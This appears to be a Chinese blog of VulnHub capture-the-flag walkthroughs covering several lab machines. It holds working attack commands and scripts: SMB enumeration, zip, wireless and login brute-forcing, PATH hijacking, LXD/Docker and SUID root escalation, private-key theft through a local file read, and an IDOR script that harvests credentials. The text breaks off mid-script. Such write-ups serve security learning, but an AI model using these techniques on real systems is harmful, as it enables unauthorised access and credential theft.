<p>存在 Smb 服务。在计算机网络中，SMB服务是指一种共享文件和打印机等资源的服务。SMB服务通常运行在服务器或网络存储设备上，并通过SMB协议与客户端进行通信，以便客户端可以访问和使用这些共享资源。</p>
<p>利用 nmap 的默认脚本进行扫描，发现利用失败了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p139,445 --script smb-vuln* 192.168.126.132</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425194125331.png" alt="image-20230425194125331"></p>
<p>smbmap是一个开源的命令行工具，用于枚举和扫描远程Windows系统中的共享文件夹。它可以在本地或远程运行，提供简单易用的界面和功能，可以列出共享目录、列出目录下的文件和子目录、上传&#x2F;下载文件等操作。同时，smbmap还支持使用不同的身份验证方式（如NTLM hash、明文密码等）与目标系统进行连接。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425194504837.png" alt="image-20230425194504837"></p>
<p>发现两个共享目录，但是没有权限访问。</p>
<p>用 enum4linux 进行探测，结果和 smbmap 是一样的。它使用SMB协议来扫描网络，并提供了一系列功能，包括列出共享、列出用户和组、列出计算机上安装的软件、获取唯一用户ID（UID）、获取工作组名称、枚举服务等。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -S -U 192.168.126.132</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425195211636.png" alt="image-20230425195211636"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425195716470.png" alt="image-20230425195716470"></p>
<p>这时候我们再尝试用 smbmap 以不同用户扫一下，发现只有密码正确或者是不需要密码的用户才有访问权限。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425201015617.png" alt="image-20230425201015617"></p>
<p>接下来用 smbclient 来访问共享文件，访问 smb 用户的隐藏目录，并且利用 get 下载文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425201818451.png" alt="image-20230425201818451"></p>
<p>尝试利用 main.txt 中的内容进行解密压缩包发现失败，使用工具 fcrackzip。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fcrackzip</span><br><span class="line">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425202708965.png" alt="image-20230425202708965"></p>
<p>分析一下数据包，发现是无线网络的，使用 aircrack-ng 来进行破解，得到 SSID 和密码。相关概念可参考，<a target="_blank" rel="noopener" href="https://product.pconline.com.cn/itbk/wlbg/wlsbjc/1703/9006926.html">无线路由器中的SSID广播和网络密钥有什么作用-太平洋IT百科 (pconline.com.cn)</a>。通常来说，SSID 就是我们的 WIFI 名字，而加密的密钥就是我们的密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425204222285.png" alt="image-20230425204222285"></p>
<p>发现 SSID 为 blackjax，似乎我们之前 smb 中有这一个用户，尝试用 ssh 和密钥进行连接。成功！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426144328450.png" alt="image-20230426144328450"></p>
<p>尝试利用 suid 提权，发现 netscan 可用。</p>
<p><strong>利用 xxd 查看该文件发现调用了<code>netstat -antp</code>命令，只不过在 root 权限下显示了端口的信息。</strong>所以可以尝试劫持环境变量，劫持 netstat 命令为 <code>/bin/sh</code>，就相当于 root 用户执行了 <code>/bin/sh</code>，成功提权。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line">echo &quot;/bin/sh&quot; &gt; netstat</span><br><span class="line">chmod 755 netstat </span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">echo $PATH </span><br><span class="line">netscan </span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426145934864.png" alt="image-20230426145934864"></p>
<h2 id="CYNIX-1"><a href="#CYNIX-1" class="headerlink" title="CYNIX: 1"></a>CYNIX: 1</h2><p>总结：从提示的角度一步步深入挖掘到本地文件读取的漏洞；学习了 lxd 提权并整理了脚本。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cynix-1,394/">CyNix: 1 ~ VulnHub</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426154511262.png" alt="image-20230426154511262"></p>
<p>一开始用 dirsearch 没扫出来，根据视频用 dirbuster 的字典能扫到一个目录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426163308419.png" alt="image-20230426163308419"></p>
<p>尝试二级目录扫描。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426163326397.png" alt="image-20230426163326397"></p>
<p>似乎没有得到什么有用的信息。玩一下页面发现有一个留言板，尝试输入抓包分析。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165129888.png" alt="image-20230426165129888"></p>
<p>找到一个关键的页面 canyoupassbyme.php，访问试试看，发现存在表单的提交。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165229181.png" alt="image-20230426165229181"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165318867.png" alt="image-20230426165318867"></p>
<p>也许是文件上传或者是读取一个文件。尝试访问本地主机，给出了提示。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165611906.png" alt="image-20230426165611906"></p>
<p>尝试本地目录和文件的读取，也给出了提示，似乎过滤了很多字符。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426165728214.png" alt="image-20230426165728214"></p>
<p>提示了输入具体的数字，尝试输入数字然后加上我们的路径，居然发现成功了。</p>
<p>一个 IP 转换的知识点，以下的几种方式都一样：</p>
<ul>
<li><code>ping 127.0.0.1</code></li>
<li><code>ping 127.0.1</code></li>
<li><code>ping 127.1</code></li>
<li><code>ping 0x7f.1</code></li>
<li><code>ping 2130706433</code></li>
</ul>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426170024986.png" alt="image-20230426170024986"></p>
<p>可以发现存在一个可以用于登录的 ford 用户，那么尝试能不能读取该用户的私钥 id_rsa，发现可以。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426170620609.png" alt="image-20230426170620609"></p>
<p>尝试登录，<strong>注意需要设置密钥的权限，否则会登录失败</strong>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa ford@192.168.126.133 -p 6688</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426183155224.png" alt="image-20230426183155224"></p>
<p>学习一种新的提权方法，lxd提权。LXD是一个容器超级管理器，提供用户友好的界面来管理和部署Linux容器。它允许在单个主机上运行多个隔离的Linux容器，共享相同的内核但具有自己的独立用户空间。LXD是一个root进程，它可以负责执行任意用户的LXD UNIX写入访问操作。提权方法：用户创建一个容器，再用容器挂载宿主机的磁盘，然后用容器的权限去操作宿主机磁盘内容从而达到提权。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法一</span></span><br><span class="line">lxc image list		# 查看容器</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载镜像，security.privileged=<span class="literal">true</span> 表示是一个特权容器，能够获得主机系统上的所有特权</span></span><br><span class="line">lxc init ubuntu:16.06 pursue -c security.privileged=true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法二</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">python -m http.server 5555</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">cd /tmp/</span><br><span class="line">wget http://192.168.126.130:5555/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias my_case</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建容器</span></span><br><span class="line">lxc init my_case MyCase -c security.privileged=true</span><br><span class="line">lxc list		# 查看存在的容器</span><br><span class="line">lxc config device add MyCase MyCase2 disk source=/ path=/mnt/root recursive=true	# 在 /mnt/root 下挂载整个磁盘</span><br><span class="line">lxc start MyCase		# 启动容器</span><br><span class="line">lxc exec MyCase /bin/sh			# 与容器交互</span><br><span class="line"></span><br><span class="line">cd /mnt/root/</span><br><span class="line">chroot ./ /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426185715094.png" alt="image-20230426185715094"></p>
<h2 id="HACKNOS-OS-HACKNOS-3"><a href="#HACKNOS-OS-HACKNOS-3" class="headerlink" title="HACKNOS: OS-HACKNOS-3"></a>HACKNOS: OS-HACKNOS-3</h2><p>总结：学习了利用 hydra 进行密码的爆破，还是得多用；学习了通过 cpulimit 进行suid 提权，要学会通过查看命令的帮助理解命令，尝试不同的命令进行测试；学习了 docker 提权，和上面的 lxd 挺像的，两条命令解决。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">hackNos: Os-hackNos-3 ~ VulnHub</a></p>
</blockquote>
<p>信息收集，尝试利用 gobuster 和 disearch 进行一级目录和二级目录的扫描，找到登录页面<code>/websec/admin</code>。查看页面源代码发现CMS。利用<code>cewl</code>爬取网站的单词，看起来挺好用的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.126.134/websec &gt; cewl.txt</span><br><span class="line">cat login.txt</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">Log</span><br><span class="line">password</span><br><span class="line">Gila</span><br><span class="line">CMS</span><br><span class="line">Show</span><br><span class="line">Forgot</span><br><span class="line">Reset</span><br><span class="line">Password</span><br><span class="line">your</span><br><span class="line">Enter</span><br><span class="line">email</span><br><span class="line">address</span><br><span class="line">and</span><br><span class="line">will</span><br><span class="line">send</span><br><span class="line">you</span><br><span class="line">link</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>

<p>尝试爆破邮件密码，因为之前的页面中存在该博主的邮件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l contact@hacknos.com -P cewl.txt 192.168.126.134 http-post-form &quot;/websec/admin:username=^USER^&amp;password=^PASS^:Wrong email&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">^USER^ 和 ^PASS^ 用于替换用户名和密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Wrong email 是错误信息，当用户名和密码不对时会显示</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426195721615.png" alt="image-20230426195721615"></p>
<p>进入后台发现可以上传 php 文件反弹 shell，并且我们发现该用户是 admin。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230426200152359.png" alt="image-20230426200152359"></p>
<p>需要注意的是，文件上传后是进入了 assert 目录，并且我们发现在该目录下存在 .htaccess，限制了 php 文件的访问。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.php&gt;</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<p>利用 suid 提权，利用的程序是<code>/usr/bin/cpulimit</code>。cpulimit是一个用于限制进程CPU使用率的Linux命令行实用程序。它可以让你限制一个进程所占用的CPU时间百分比，从而避免应用程序过度占用CPU导致系统性能下降或崩溃。cpulimit可以通过PID或者进程名来指定要限制的进程，并且支持多种限制模式和选项。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        setreuid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp		# 注意 gcc 的版本</span><br><span class="line">chmod +x exp</span><br><span class="line">cpulimit -l 50 -f ./exp</span><br></pre></td></tr></table></figure>

<p>学习一下 docker 提权，发现用户 blackdevil 是在 docker 组下。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine chroot /mnt sh		# 下载镜像并创建 shell</span><br><span class="line">docker run -it -v /:/mbt cc0abc535e36		# 将磁盘根目录挂载到容器的 /mbt 下</span><br></pre></td></tr></table></figure>



<h2 id="ME-AND-MY-GIRLFRIEND-1"><a href="#ME-AND-MY-GIRLFRIEND-1" class="headerlink" title="ME AND MY GIRLFRIEND: 1"></a>ME AND MY GIRLFRIEND: 1</h2><p>总结：尝试自己编写脚本；发现 sudo 可以无密码执行 php 代码。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">Me and My Girlfriend: 1 ~ VulnHub</a></p>
</blockquote>
<p>做一些目录的扫描，发现了一些目录读取的 url。首页提示要用本地访问，所以加上<code>X-Forwarded-For</code>绕过。或者是使用火狐的插件，这样就不用每次抓包修改了，插件如下：<a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-CN/firefox/addon/x-forwarded-for-injector/%E3%80%82">https://addons.mozilla.org/zh-CN/firefox/addon/x-forwarded-for-injector/。</a></p>
<p>注册做一下信息的收集，如果没记错，应该是一个横向提权的漏洞，通过 user_id 可以访问到不同的用户，而且有密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427192644133.png" alt="image-20230427192644133"></p>
<p>写了一个信息收集的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    params = &#123;<span class="string">&quot;page&quot;</span> : <span class="string">&quot;profile&quot;</span>, <span class="string">&quot;user_id&quot;</span> : <span class="built_in">str</span>(<span class="built_in">id</span>)&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span> : <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;PHPSESSID=1fk7omtvkbrni5dit4gp3vd9v0&quot;</span>&#125;</span><br><span class="line">    rs = requests.get(<span class="string">&quot;http://192.168.126.135/index.php&quot;</span>, params = params, headers = headers)</span><br><span class="line">    <span class="comment"># return rs.text</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; value=&quot;eweuhtandingan&quot;&gt;&lt;br&gt;</span></span><br><span class="line">    <span class="comment"># &lt;label for=&quot;password&quot;&gt;Password&lt;/label&gt;</span></span><br><span class="line">    <span class="comment"># &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; value=&quot;skuyatuh&quot;&gt;&lt;br&gt;</span></span><br><span class="line">    text = rs.text</span><br><span class="line">    username = re.search(<span class="string">&quot;id=\&quot;username\&quot; value=\&quot;(.*)\&quot;&gt;&lt;br&gt;&quot;</span>, text).group(<span class="number">1</span>)</span><br><span class="line">    password = re.search(<span class="string">&quot;id=\&quot;password\&quot; value=\&quot;(.*)\&quot;&gt;&lt;br&gt;&quot;</span>, text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> username, password</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;info.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    tmp = get_info(i)</span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">0</span>] != <span class="string">&#x27;&#x27;</span>:  </span><br><span class="line">        f.write(tmp[<span class="number">0</span>] + <span class="string">&quot;:&quot;</span> + tmp[<span class="number">1</span>] + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427194711816.png" alt="image-20230427194711816"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -C info.txt ssh://192.168.126.135</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230427200542661.png" alt="image-20230427200542661"></p>
<p>发现 php 不需要密码就可以运行，那么用 php 反弹一个 shell 就行，<strong>别忘了用 sudo 执行</strong>。</p>
<h2 id="CONNECT-THE-DOTS-1"><a href="#CONNECT-THE-DOTS-1" class="headerlink" title="CONNECT THE DOTS: 1"></a>CONNECT THE DOTS: 1</h2><p>总结：学习了不同服务的功能；了解一些加密算法；重要的是学会利用 getcap 读取文件的功能进行利用。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/connect-the-dots-1,384/">Connect The Dots: 1 ~ VulnHub</a></p>
</blockquote>
<p>扫一下端口发现开启了好多的服务。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429111419253.png" alt="image-20230429111419253"></p>
<ul>
<li>21&#x2F;tcp：开放的 FTP 服务（vsftpd 2.0.8 或更高版本）。</li>
<li>80&#x2F;tcp：开放的 HTTP 服务（Apache httpd 2.4.38 (Debian)），网页标题为 “Landing Page”。</li>
<li>111&#x2F;tcp：开放的 RPCbind 服务，支持远程过程调用（RPC）协议和多种服务和端口映射。</li>
<li>2049&#x2F;tcp：开放的 NFS ACL 服务（RPC #100227），用于安全访问 Network File System（NFS）共享文件。</li>
<li>7822&#x2F;tcp：开放的 SSH 服务（OpenSSH 7.9p1 Debian 10+deb10u1），用于远程登录和管理主机。</li>
<li>33301&#x2F;tcp、37975&#x2F;tcp 和 55545&#x2F;tcp：开放的 mountd 服务（RPC #100005），用于挂载文件系统。</li>
<li>46701&#x2F;tcp：开放的 nlockmgr 服务（RPC #100021），用于提供分布式锁服务。</li>
</ul>
<p>利用 showmount 查看 NFS 服务器的情况。showmount是一个用于显示NFS（网络文件系统）挂载信息的命令行工具。它可以列出指定NFS服务器上已经导出的文件系统，并显示哪些客户端正在访问这些文件系统。showmount命令通常在NFS服务器上使用，以便管理员可以查看当前的NFS挂载情况和相关信息，以便进行故障排除和管理操作。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429113521540.png" alt="image-20230429113521540"></p>
<p>尝试挂载目录，不过好像目录不全、权限不够。失败！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.126.136:/home/morris /home/pursue/vulnhub/CONNECT_THE_DOTS_1</span><br></pre></td></tr></table></figure>

<p>通过首页的信息我们发现有两个用户 morris 和 norris。扫一下目录，发现有比较可疑的目录 mysite。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429114052922.png" alt="image-20230429114052922"></p>
<p>在注册的页面中，注册发现没反应，抓个包发现访问了 &#x2F;mysite&#x2F;bootstrap.min.css.map，找了一下发现了jsfuck编码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429121558252.png" alt="image-20230429121558252"></p>
<p>找到了密文：You’re smart enough to understand me. Here’s your secret, TryToGuessThisNorris@2k19。尝试 ssh 登录。</p>
<p>利用 ftp 进行登录，同样尝试上述解出来的密码。进入后 lpwd 发现是 root 用户的目录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429122944901.png" alt="image-20230429122944901"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429123449149.png" alt="image-20230429123449149"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEY NORRIS, YOU&#x27;VE MADE THIS FAR. FAR FAR FROM HEAVEN WANNA SEE HELL NOW? HAHA YOU SURELY MISSED ME, DIDN&#x27;T YOU? OH DAMN MY BATTERY IS ABOUT TO DIE AND I AM UNABLE TO FIND MY CHARGER SO QUICKLY LEAVING A HINT IN HERE BEFORE THIS SYSTEM SHUTS DOWN AUTOMATICALLY. I AM SAVING THE GATEWAY TO MY DUNGEON IN A &#x27;SECRETFILE&#x27; WHICH IS PUBLICLY ACCESSIBLE.</span><br></pre></td></tr></table></figure>

<p>似乎是有这个 SECRETFILE 文件，找一下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429123936252.png" alt="image-20230429123936252"></p>
<p>.swp是Vim编辑器使用的临时文件扩展名，在打开文件进行编辑时，Vim会在相同目录下创建一个与该文件同名的.swp文件，并在其中保存编辑器中未保存的修改内容。这样，即使发生了系统崩溃或其他不可预见的错误，也可以通过.swp文件恢复原始文件的状态。</p>
<p>没有权限访问，但是在网站目录下，我们可以下载来查看，发现了一个密码 blehguessme090，是 morris 用户的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429124331022.png" alt="image-20230429124331022"></p>
<p>学习一种新的提权方式。首先利用 getcap 查看命令的能力。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429125228572.png" alt="image-20230429125228572"></p>
<p><strong>getcap 列出了 &#x2F;usr&#x2F;bin&#x2F;tar 文件所设置的一种能力：<code>CAP_DAC_READ_SEARCH</code>，这允许tar程序读取任何文件，而不仅仅是当前用户有权限的文件。此外，该文件也已经设置了<code>EP</code>位，表示该文件可以以root权限执行。这非常重要。</strong>所以我们就可以利用 tar 进行打包 root 文件夹下的文件然后进行传输下载读取。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf /tmp/root.tar.gz /root/</span><br><span class="line">tar -xzvf ./root.tar.gz</span><br></pre></td></tr></table></figure>



<h2 id="DJINN-1"><a href="#DJINN-1" class="headerlink" title="DJINN: 1"></a>DJINN: 1</h2><p>总结：学习了利用 python 的 socket 模块与目标端口进行交互和数据的处理；学习了利用 man 命令对手册的读取；了解了 python2 对于用户输入处理上的一个漏洞。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/djinn-1,397/">djinn: 1 ~ VulnHub</a></p>
</blockquote>
<p>常规收集信息，1337 端口挺奇怪的，尝试用浏览器和 nc 连接试试看，发现是一个游戏端口，是用来计算的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429180107119.png" alt="image-20230429180107119"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230429180132579.png" alt="image-20230429180132579"></p>
<p>尝试使用 python 的 socket 写一个脚本，呜呜呜，调试了好久才行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.126.137&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.settimeout(<span class="number">2.0</span>)</span><br><span class="line">s.connect((host, port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            data = <span class="built_in">str</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Received: &quot;</span>, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&gt;&#x27;</span> <span 